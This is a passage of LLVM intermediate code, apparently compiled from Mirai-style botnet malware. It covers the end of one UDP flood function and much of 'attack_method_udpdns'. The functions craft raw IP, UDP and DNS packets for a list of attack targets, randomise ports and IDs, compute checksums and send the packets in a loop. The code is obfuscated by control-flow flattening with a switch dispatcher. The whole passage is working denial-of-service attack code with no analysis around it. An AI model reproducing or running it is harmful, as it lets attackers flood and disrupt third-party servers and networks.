  %95 = bitcast %struct.iphdr* %94 to i8*
  %96 = load i8, i8* %95, align 4
  %97 = and i8 %96, 15
  %98 = or i8 %97, 64
  store i8 %98, i8* %95, align 4
  %99 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %100 = bitcast %struct.iphdr* %99 to i8*
  %101 = load i8, i8* %100, align 4
  %102 = and i8 %101, -16
  %103 = or i8 %102, 5
  store i8 %103, i8* %100, align 4
  %104 = load i8, i8* %12, align 1
  %105 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %106 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %105, i32 0, i32 1
  store i8 %104, i8* %106, align 1
  %107 = load i32, i32* %19, align 4
  %108 = sext i32 %107 to i64
  %109 = add i64 32, %108
  %110 = trunc i64 %109 to i16
  %111 = call zeroext i16 @htons(i16 zeroext %110) #7
  %112 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %113 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %112, i32 0, i32 2
  store i16 %111, i16* %113, align 2
  %114 = load i16, i16* %13, align 2
  %115 = call zeroext i16 @htons(i16 zeroext %114) #7
  %116 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %117 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %116, i32 0, i32 3
  store i16 %115, i16* %117, align 4
  %118 = load i8, i8* %14, align 1
  %119 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %120 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %119, i32 0, i32 5
  store i8 %118, i8* %120, align 4
  %121 = load i8, i8* %15, align 1
  %122 = icmp ne i8 %121, 0
  %123 = select i1 %122, i32 93738578, i32 -690569843
  store i32 %123, i32* %switchVar
  br label %loopEnd

; <label>:124:                                    ; preds = %loopEntry
  %125 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %126 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %127 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %126, i32 0, i32 4
  store i16 %125, i16* %127, align 2
  store i32 -690569843, i32* %switchVar
  br label %loopEnd

; <label>:128:                                    ; preds = %loopEntry
  %129 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %130 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %129, i32 0, i32 6
  store i8 17, i8* %130, align 1
  %131 = load i32, i32* @LOCAL_ADDR, align 4
  %132 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %133 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %132, i32 0, i32 8
  store i32 %131, i32* %133, align 4
  %134 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %135 = load i32, i32* %9, align 4
  %136 = sext i32 %135 to i64
  %137 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %134, i64 %136
  %138 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %137, i32 0, i32 1
  %139 = load i32, i32* %138, align 4
  %140 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %141 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %140, i32 0, i32 9
  store i32 %139, i32* %141, align 4
  %142 = load i16, i16* %16, align 2
  %143 = call zeroext i16 @htons(i16 zeroext %142) #7
  %144 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %145 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %144, i32 0, i32 0
  store i16 %143, i16* %145, align 2
  %146 = load i16, i16* %17, align 2
  %147 = call zeroext i16 @htons(i16 zeroext %146) #7
  %148 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %149 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %148, i32 0, i32 1
  store i16 %147, i16* %149, align 2
  %150 = load i32, i32* %19, align 4
  %151 = sext i32 %150 to i64
  %152 = add i64 12, %151
  %153 = trunc i64 %152 to i16
  %154 = call zeroext i16 @htons(i16 zeroext %153) #7
  %155 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %156 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %155, i32 0, i32 2
  store i16 %154, i16* %156, align 2
  %157 = load i8*, i8** %22, align 8
  %158 = bitcast i8* %157 to i32*
  store i32 -1, i32* %158, align 4
  %159 = load i8*, i8** %22, align 8
  %160 = getelementptr inbounds i8, i8* %159, i64 4
  store i8* %160, i8** %22, align 8
  %161 = load i8*, i8** %22, align 8
  %162 = load i8*, i8** %18, align 8
  %163 = load i32, i32* %19, align 4
  call void @util_memcpy(i8* %161, i8* %162, i32 %163)
  store i32 -810342527, i32* %switchVar
  br label %loopEnd

; <label>:164:                                    ; preds = %loopEntry
  %165 = load i32, i32* %9, align 4
  %166 = add nsw i32 %165, 1
  store i32 %166, i32* %9, align 4
  store i32 -1972426222, i32* %switchVar
  br label %loopEnd

; <label>:167:                                    ; preds = %loopEntry
  store i32 1009100238, i32* %switchVar
  br label %loopEnd

; <label>:168:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 93827538, i32* %switchVar
  br label %loopEnd

; <label>:169:                                    ; preds = %loopEntry
  %170 = load i32, i32* %9, align 4
  %171 = load i8, i8* %5, align 1
  %172 = zext i8 %171 to i32
  %173 = icmp slt i32 %170, %172
  %174 = select i1 %173, i32 -1965633192, i32 -1164495266
  store i32 %174, i32* %switchVar
  br label %loopEnd

; <label>:175:                                    ; preds = %loopEntry
  %176 = load i8**, i8*** %11, align 8
  %177 = load i32, i32* %9, align 4
  %178 = sext i32 %177 to i64
  %179 = getelementptr inbounds i8*, i8** %176, i64 %178
  %180 = load i8*, i8** %179, align 8
  store i8* %180, i8** %23, align 8
  %181 = load i8*, i8** %23, align 8
  %182 = bitcast i8* %181 to %struct.iphdr*
  store %struct.iphdr* %182, %struct.iphdr** %24, align 8
  %183 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %184 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %183, i64 1
  %185 = bitcast %struct.iphdr* %184 to %struct.udphdr*
  store %struct.udphdr* %185, %struct.udphdr** %25, align 8
  %186 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %187 = load i32, i32* %9, align 4
  %188 = sext i32 %187 to i64
  %189 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %186, i64 %188
  %190 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %189, i32 0, i32 2
  %191 = load i8, i8* %190, align 4
  %192 = zext i8 %191 to i32
  %193 = icmp slt i32 %192, 32
  %194 = select i1 %193, i32 -237635156, i32 1270743707
  store i32 %194, i32* %switchVar
  br label %loopEnd

; <label>:195:                                    ; preds = %loopEntry
  %196 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %197 = load i32, i32* %9, align 4
  %198 = sext i32 %197 to i64
  %199 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %196, i64 %198
  %200 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %199, i32 0, i32 1
  %201 = load i32, i32* %200, align 4
  %202 = call i32 @ntohl(i32 %201) #7
  %203 = call i32 @rand_next()
  %204 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %205 = load i32, i32* %9, align 4
  %206 = sext i32 %205 to i64
  %207 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %204, i64 %206
  %208 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %207, i32 0, i32 2
  %209 = load i8, i8* %208, align 4
  %210 = zext i8 %209 to i32
  %211 = lshr i32 %203, %210
  %212 = add i32 %202, %211
  %213 = call i32 @htonl(i32 %212) #7
  %214 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %215 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %214, i32 0, i32 9
  store i32 %213, i32* %215, align 4
  store i32 1270743707, i32* %switchVar
  br label %loopEnd

; <label>:216:                                    ; preds = %loopEntry
  %217 = load i16, i16* %13, align 2
  %218 = zext i16 %217 to i32
  %219 = icmp eq i32 %218, 65535
  %220 = select i1 %219, i32 -1765818016, i32 -1628654431
  store i32 %220, i32* %switchVar
  br label %loopEnd

; <label>:221:                                    ; preds = %loopEntry
  %222 = call i32 @rand_next()
  %223 = trunc i32 %222 to i16
  %224 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %225 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %224, i32 0, i32 3
  store i16 %223, i16* %225, align 4
  store i32 -1628654431, i32* %switchVar
  br label %loopEnd

; <label>:226:                                    ; preds = %loopEntry
  %227 = load i16, i16* %16, align 2
  %228 = zext i16 %227 to i32
  %229 = icmp eq i32 %228, 65535
  %230 = select i1 %229, i32 211372649, i32 -990078033
  store i32 %230, i32* %switchVar
  br label %loopEnd

; <label>:231:                                    ; preds = %loopEntry
  %232 = call i32 @rand_next()
  %233 = trunc i32 %232 to i16
  %234 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %235 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %234, i32 0, i32 0
  store i16 %233, i16* %235, align 2
  store i32 -990078033, i32* %switchVar
  br label %loopEnd

; <label>:236:                                    ; preds = %loopEntry
  %237 = load i16, i16* %17, align 2
  %238 = zext i16 %237 to i32
  %239 = icmp eq i32 %238, 65535
  %240 = select i1 %239, i32 -1003274590, i32 1655637810
  store i32 %240, i32* %switchVar
  br label %loopEnd

; <label>:241:                                    ; preds = %loopEntry
  %242 = call i32 @rand_next()
  %243 = trunc i32 %242 to i16
  %244 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %245 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %244, i32 0, i32 1
  store i16 %243, i16* %245, align 2
  store i32 1655637810, i32* %switchVar
  br label %loopEnd

; <label>:246:                                    ; preds = %loopEntry
  %247 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %248 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %247, i32 0, i32 7
  store i16 0, i16* %248, align 2
  %249 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %250 = bitcast %struct.iphdr* %249 to i16*
  %251 = call zeroext i16 @checksum_generic(i16* %250, i32 20)
  %252 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %253 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %252, i32 0, i32 7
  store i16 %251, i16* %253, align 2
  %254 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %255 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %254, i32 0, i32 3
  store i16 0, i16* %255, align 2
  %256 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %257 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %258 = bitcast %struct.udphdr* %257 to i8*
  %259 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %260 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %259, i32 0, i32 2
  %261 = load i16, i16* %260, align 2
  %262 = load i32, i32* %19, align 4
  %263 = sext i32 %262 to i64
  %264 = add i64 12, %263
  %265 = trunc i64 %264 to i32
  %266 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %256, i8* %258, i16 zeroext %261, i32 %265)
  %267 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %268 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %267, i32 0, i32 3
  store i16 %266, i16* %268, align 2
  %269 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %270 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %269, i32 0, i32 1
  %271 = load i16, i16* %270, align 2
  %272 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %273 = load i32, i32* %9, align 4
  %274 = sext i32 %273 to i64
  %275 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %272, i64 %274
  %276 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %275, i32 0, i32 0
  %277 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %276, i32 0, i32 1
  store i16 %271, i16* %277, align 2
  %278 = load i32, i32* %10, align 4
  %279 = load i8*, i8** %23, align 8
  %280 = load i32, i32* %19, align 4
  %281 = sext i32 %280 to i64
  %282 = add i64 32, %281
  %283 = bitcast %union.__CONST_SOCKADDR_ARG* %26 to %struct.sockaddr**
  %284 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %285 = load i32, i32* %9, align 4
  %286 = sext i32 %285 to i64
  %287 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %284, i64 %286
  %288 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %287, i32 0, i32 0
  %289 = bitcast %struct.sockaddr_in* %288 to %struct.sockaddr*
  store %struct.sockaddr* %289, %struct.sockaddr** %283, align 8
  %290 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %26, i32 0, i32 0
  %291 = load %struct.sockaddr*, %struct.sockaddr** %290, align 8
  %292 = call i64 @sendto(i32 %278, i8* %279, i64 %282, i32 16384, %struct.sockaddr* %291, i32 16)
  store i32 -874822905, i32* %switchVar
  br label %loopEnd

; <label>:293:                                    ; preds = %loopEntry
  %294 = load i32, i32* %9, align 4
  %295 = add nsw i32 %294, 1
  store i32 %295, i32* %9, align 4
  store i32 93827538, i32* %switchVar
  br label %loopEnd

; <label>:296:                                    ; preds = %loopEntry
  store i32 1009100238, i32* %switchVar
  br label %loopEnd

; <label>:297:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %296, %293, %246, %241, %236, %231, %226, %221, %216, %195, %175, %169, %168, %167, %164, %128, %124, %76, %70, %69, %66, %60, %59, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_udpdns(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %.reg2mem = alloca i8*
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i16, align 2
  %19 = alloca i8, align 1
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca %struct.iphdr*, align 8
  %27 = alloca %struct.udphdr*, align 8
  %28 = alloca %struct.dnshdr*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca i8*, align 8
  %31 = alloca %struct.grehdr*, align 8
  %32 = alloca i8*, align 8
  %33 = alloca %struct.iphdr*, align 8
  %34 = alloca %struct.udphdr*, align 8
  %35 = alloca %struct.dnshdr*, align 8
  %36 = alloca i8*, align 8
  %37 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %38 = load i8, i8* %5, align 1
  %39 = zext i8 %38 to i64
  %40 = call noalias i8* @calloc(i64 %39, i64 8) #6
  %41 = bitcast i8* %40 to i8**
  store i8** %41, i8*** %11, align 8
  %42 = load i8, i8* %7, align 1
  %43 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %44 = call i32 @attack_get_opt_int(i8 zeroext %42, %struct.attack_option* %43, i8 zeroext 2, i32 0)
  %45 = trunc i32 %44 to i8
  store i8 %45, i8* %12, align 1
  %46 = load i8, i8* %7, align 1
  %47 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %48 = call i32 @attack_get_opt_int(i8 zeroext %46, %struct.attack_option* %47, i8 zeroext 3, i32 65535)
  %49 = trunc i32 %48 to i16
  store i16 %49, i16* %13, align 2
  %50 = load i8, i8* %7, align 1
  %51 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %52 = call i32 @attack_get_opt_int(i8 zeroext %50, %struct.attack_option* %51, i8 zeroext 4, i32 64)
  %53 = trunc i32 %52 to i8
  store i8 %53, i8* %14, align 1
  %54 = load i8, i8* %7, align 1
  %55 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %56 = call i32 @attack_get_opt_int(i8 zeroext %54, %struct.attack_option* %55, i8 zeroext 5, i32 0)
  %57 = trunc i32 %56 to i8
  store i8 %57, i8* %15, align 1
  %58 = load i8, i8* %7, align 1
  %59 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %60 = call i32 @attack_get_opt_int(i8 zeroext %58, %struct.attack_option* %59, i8 zeroext 6, i32 65535)
  %61 = trunc i32 %60 to i16
  store i16 %61, i16* %16, align 2
  %62 = load i8, i8* %7, align 1
  %63 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %64 = call i32 @attack_get_opt_int(i8 zeroext %62, %struct.attack_option* %63, i8 zeroext 7, i32 53)
  %65 = trunc i32 %64 to i16
  store i16 %65, i16* %17, align 2
  %66 = load i8, i8* %7, align 1
  %67 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %68 = call i32 @attack_get_opt_int(i8 zeroext %66, %struct.attack_option* %67, i8 zeroext 9, i32 65535)
  %69 = trunc i32 %68 to i16
  store i16 %69, i16* %18, align 2
  %70 = load i8, i8* %7, align 1
  %71 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %72 = call i32 @attack_get_opt_int(i8 zeroext %70, %struct.attack_option* %71, i8 zeroext 0, i32 12)
  %73 = trunc i32 %72 to i8
  store i8 %73, i8* %19, align 1
  %74 = load i8, i8* %7, align 1
  %75 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %76 = call i8* @attack_get_opt_str(i8 zeroext %74, %struct.attack_option* %75, i8 zeroext 8, i8* null)
  store i8* %76, i8** %20, align 8
  %77 = call i32 @get_dns_resolver()
  store i32 %77, i32* %22, align 4
  %78 = load i8*, i8** %20, align 8
  store i8* %78, i8** %.reg2mem
  %switchVar = alloca i32
  store i32 1739545661, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1739545661, label %first
    i32 -604058535, label %81
    i32 419665382, label %82
    i32 -412128545, label %88
    i32 1231065060, label %89
    i32 843920201, label %95
    i32 -297974303, label %98
    i32 1574240242, label %99
    i32 -1315205528, label %105
    i32 -2084210004, label %161
    i32 1162105534, label %165
    i32 -1597923949, label %218
    i32 -1866813197, label %223
    i32 -409534808, label %232
    i32 -168874947, label %242
    i32 979738842, label %245
    i32 1748167224, label %246
    i32 -1629278927, label %249
    i32 -933038020, label %264
    i32 1228069712, label %267
    i32 2116424218, label %268
    i32 -1336984126, label %269
    i32 142061095, label %275
    i32 -1642123844, label %297
    i32 -151829328, label %303
    i32 -1738839121, label %308
    i32 -1579130577, label %314
    i32 1691383893, label %319
    i32 -543827926, label %325
    i32 -1237232935, label %330
    i32 -1745681535, label %336
    i32 1391390922, label %404
    i32 1810750079, label %407
    i32 -1103189981, label %408
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i8*, i8** %.reg2mem
  %79 = icmp eq i8* %.reload, null
  %80 = select i1 %79, i32 -604058535, i32 419665382
  store i32 %80, i32* %switchVar
  br label %loopEnd

; <label>:81:                                     ; preds = %loopEntry
  store i32 -1103189981, i32* %switchVar
  br label %loopEnd

; <label>:82:                                     ; preds = %loopEntry
  %83 = load i8*, i8** %20, align 8
  %84 = call i32 @util_strlen(i8* %83)
  store i32 %84, i32* %21, align 4
  %85 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %85, i32* %10, align 4
  %86 = icmp eq i32 %85, -1
  %87 = select i1 %86, i32 -412128545, i32 1231065060
  store i32 %87, i32* %switchVar
  br label %loopEnd

; <label>:88:                                     ; preds = %loopEntry
  store i32 -1103189981, i32* %switchVar
  br label %loopEnd

; <label>:89:                                     ; preds = %loopEntry
  store i32 1, i32* %9, align 4
  %90 = load i32, i32* %10, align 4
  %91 = bitcast i32* %9 to i8*
  %92 = call i32 @setsockopt(i32 %90, i32 0, i32 3, i8* %91, i32 4) #6
  %93 = icmp eq i32 %92, -1
  %94 = select i1 %93, i32 843920201, i32 -297974303
  store i32 %94, i32* %switchVar
  br label %loopEnd

; <label>:95:                                     ; preds = %loopEntry
  %96 = load i32, i32* %10, align 4
  %97 = call i32 @close(i32 %96)
  store i32 -1103189981, i32* %switchVar
  br label %loopEnd

; <label>:98:                                     ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 1574240242, i32* %switchVar
  br label %loopEnd

; <label>:99:                                     ; preds = %loopEntry
  %100 = load i32, i32* %9, align 4
  %101 = load i8, i8* %5, align 1
  %102 = zext i8 %101 to i32
  %103 = icmp slt i32 %100, %102
  %104 = select i1 %103, i32 -1315205528, i32 1228069712
  store i32 %104, i32* %switchVar
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  store i8 0, i8* %24, align 1
  store i8 0, i8* %25, align 1
  %106 = call noalias i8* @calloc(i64 600, i64 1) #6
  %107 = load i8**, i8*** %11, align 8
  %108 = load i32, i32* %9, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds i8*, i8** %107, i64 %109
  store i8* %106, i8** %110, align 8
  %111 = load i8**, i8*** %11, align 8
  %112 = load i32, i32* %9, align 4
  %113 = sext i32 %112 to i64
  %114 = getelementptr inbounds i8*, i8** %111, i64 %113
  %115 = load i8*, i8** %114, align 8
  %116 = bitcast i8* %115 to %struct.iphdr*
  store %struct.iphdr* %116, %struct.iphdr** %26, align 8
  %117 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %118 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %117, i64 1
  %119 = bitcast %struct.iphdr* %118 to %struct.udphdr*
  store %struct.udphdr* %119, %struct.udphdr** %27, align 8
  %120 = load %struct.udphdr*, %struct.udphdr** %27, align 8
  %121 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %120, i64 1
  %122 = bitcast %struct.udphdr* %121 to %struct.dnshdr*
  store %struct.dnshdr* %122, %struct.dnshdr** %28, align 8
  %123 = load %struct.dnshdr*, %struct.dnshdr** %28, align 8
  %124 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %123, i64 1
  %125 = bitcast %struct.dnshdr* %124 to i8*
  store i8* %125, i8** %29, align 8
  %126 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %127 = bitcast %struct.iphdr* %126 to i8*
  %128 = load i8, i8* %127, align 4
  %129 = and i8 %128, 15
  %130 = or i8 %129, 64
  store i8 %130, i8* %127, align 4
  %131 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %132 = bitcast %struct.iphdr* %131 to i8*
  %133 = load i8, i8* %132, align 4
  %134 = and i8 %133, -16
  %135 = or i8 %134, 5
  store i8 %135, i8* %132, align 4
  %136 = load i8, i8* %12, align 1
  %137 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %138 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %137, i32 0, i32 1
  store i8 %136, i8* %138, align 1
  %139 = load i8, i8* %19, align 1
  %140 = zext i8 %139 to i64
  %141 = add i64 41, %140
  %142 = add i64 %141, 2
  %143 = load i32, i32* %21, align 4
  %144 = sext i32 %143 to i64
  %145 = add i64 %142, %144
  %146 = add i64 %145, 4
  %147 = trunc i64 %146 to i16
  %148 = call zeroext i16 @htons(i16 zeroext %147) #7
  %149 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %150 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %149, i32 0, i32 2
  store i16 %148, i16* %150, align 2
  %151 = load i16, i16* %13, align 2
  %152 = call zeroext i16 @htons(i16 zeroext %151) #7
  %153 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %154 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %153, i32 0, i32 3
  store i16 %152, i16* %154, align 4
  %155 = load i8, i8* %14, align 1
  %156 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %157 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %156, i32 0, i32 5
  store i8 %155, i8* %157, align 4
  %158 = load i8, i8* %15, align 1
  %159 = icmp ne i8 %158, 0
  %160 = select i1 %159, i32 -2084210004, i32 1162105534
  store i32 %160, i32* %switchVar
  br label %loopEnd

; <label>:161:                                    ; preds = %loopEntry
  %162 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %163 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %164 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %163, i32 0, i32 4
  store i16 %162, i16* %164, align 2
  store i32 1162105534, i32* %switchVar
  br label %loopEnd

; <label>:165:                                    ; preds = %loopEntry
  %166 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %167 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %166, i32 0, i32 6
  store i8 17, i8* %167, align 1
  %168 = load i32, i32* @LOCAL_ADDR, align 4
  %169 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %170 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %169, i32 0, i32 8
  store i32 %168, i32* %170, align 4
  %171 = load i32, i32* %22, align 4
  %172 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %173 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %172, i32 0, i32 9
  store i32 %171, i32* %173, align 4
  %174 = load i16, i16* %16, align 2
  %175 = call zeroext i16 @htons(i16 zeroext %174) #7
  %176 = load %struct.udphdr*, %struct.udphdr** %27, align 8
  %177 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %176, i32 0, i32 0
  store i16 %175, i16* %177, align 2
  %178 = load i16, i16* %17, align 2
  %179 = call zeroext i16 @htons(i16 zeroext %178) #7
  %180 = load %struct.udphdr*, %struct.udphdr** %27, align 8
  %181 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %180, i32 0, i32 1
  store i16 %179, i16* %181, align 2
  %182 = load i8, i8* %19, align 1
  %183 = zext i8 %182 to i64
  %184 = add i64 21, %183
  %185 = add i64 %184, 2
  %186 = load i32, i32* %21, align 4
  %187 = sext i32 %186 to i64
  %188 = add i64 %185, %187
  %189 = add i64 %188, 4
  %190 = trunc i64 %189 to i16
  %191 = call zeroext i16 @htons(i16 zeroext %190) #7
  %192 = load %struct.udphdr*, %struct.udphdr** %27, align 8
  %193 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %192, i32 0, i32 2
  store i16 %191, i16* %193, align 2
  %194 = load i16, i16* %18, align 2
  %195 = call zeroext i16 @htons(i16 zeroext %194) #7
  %196 = load %struct.dnshdr*, %struct.dnshdr** %28, align 8
  %197 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %196, i32 0, i32 0
  store i16 %195, i16* %197, align 2
  %198 = call zeroext i16 @htons(i16 zeroext 256) #7
  %199 = load %struct.dnshdr*, %struct.dnshdr** %28, align 8
  %200 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %199, i32 0, i32 1
  store i16 %198, i16* %200, align 2
  %201 = call zeroext i16 @htons(i16 zeroext 1) #7
  %202 = load %struct.dnshdr*, %struct.dnshdr** %28, align 8
  %203 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %202, i32 0, i32 2
  store i16 %201, i16* %203, align 2
  %204 = load i8, i8* %19, align 1
  %205 = load i8*, i8** %29, align 8
  %206 = getelementptr inbounds i8, i8* %205, i32 1
  store i8* %206, i8** %29, align 8
  store i8 %204, i8* %205, align 1
  %207 = load i8, i8* %19, align 1
  %208 = zext i8 %207 to i32
  %209 = load i8*, i8** %29, align 8
  %210 = sext i32 %208 to i64
  %211 = getelementptr inbounds i8, i8* %209, i64 %210
  store i8* %211, i8** %29, align 8
  %212 = load i8*, i8** %29, align 8
  store i8* %212, i8** %30, align 8
  %213 = load i8*, i8** %29, align 8
  %214 = getelementptr inbounds i8, i8* %213, i64 1
  %215 = load i8*, i8** %20, align 8
  %216 = load i32, i32* %21, align 4
  %217 = add nsw i32 %216, 1
  call void @util_memcpy(i8* %214, i8* %215, i32 %217)
  store i32 0, i32* %23, align 4
  store i32 -1597923949, i32* %switchVar
  br label %loopEnd

; <label>:218:                                    ; preds = %loopEntry
  %219 = load i32, i32* %23, align 4
  %220 = load i32, i32* %21, align 4
  %221 = icmp slt i32 %219, %220
  %222 = select i1 %221, i32 -1866813197, i32 -1629278927
  store i32 %222, i32* %switchVar
  br label %loopEnd

; <label>:223:                                    ; preds = %loopEntry
  %224 = load i8*, i8** %20, align 8
  %225 = load i32, i32* %23, align 4
  %226 = sext i32 %225 to i64
  %227 = getelementptr inbounds i8, i8* %224, i64 %226
  %228 = load i8, i8* %227, align 1
  %229 = sext i8 %228 to i32
  %230 = icmp eq i32 %229, 46
  %231 = select i1 %230, i32 -409534808, i32 -168874947
  store i32 %231, i32* %switchVar
  br label %loopEnd

; <label>:232:                                    ; preds = %loopEntry
  %233 = load i8, i8* %24, align 1
  %234 = load i8*, i8** %30, align 8
  store i8 %233, i8* %234, align 1
  store i8 0, i8* %24, align 1
  %235 = load i8, i8* %25, align 1
  %236 = add i8 %235, 1
  store i8 %236, i8* %25, align 1
  %237 = load i8*, i8** %29, align 8
  %238 = load i32, i32* %23, align 4
  %239 = sext i32 %238 to i64
  %240 = getelementptr inbounds i8, i8* %237, i64 %239
  %241 = getelementptr inbounds i8, i8* %240, i64 1
  store i8* %241, i8** %30, align 8
  store i32 979738842, i32* %switchVar
  br label %loopEnd

; <label>:242:                                    ; preds = %loopEntry
  %243 = load i8, i8* %24, align 1
  %244 = add i8 %243, 1
  store i8 %244, i8* %24, align 1
  store i32 979738842, i32* %switchVar
  br label %loopEnd

